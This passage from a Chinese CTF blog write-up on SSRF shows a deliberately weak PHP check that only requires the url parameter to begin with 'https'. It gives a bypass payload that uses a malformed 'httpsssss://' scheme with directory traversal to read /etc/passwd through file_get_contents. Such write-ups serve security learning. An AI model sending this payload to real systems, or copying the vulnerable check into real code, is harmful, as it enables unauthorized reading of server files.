+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ssrf.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(_FILE_);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^https/is&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no hack&quot;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>上面的代码限制了url只能是以https开头的路径，那么我们就可以如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">httpsssss:<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure>
+
+<p>此时file_get_contents()函数遇到了不认识的伪协议头，就会把他当作文件夹，然后再配合目录穿越可读取文件</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">ssrf.php?url=httpsssss://../../../../../../etc/passwd<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CTF-SSRF</div>
+      <div>http://maskobito.github.io/2025/05/08/CTF-SSRF/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>MaskObito</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年5月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/05/13/ISCC2025/" title="ISCC2025">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ISCC2025</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传">
+                        <span class="hidden-mobile">文件上传</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/typing-effect.js"></script>
+<script src="/js/particle.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
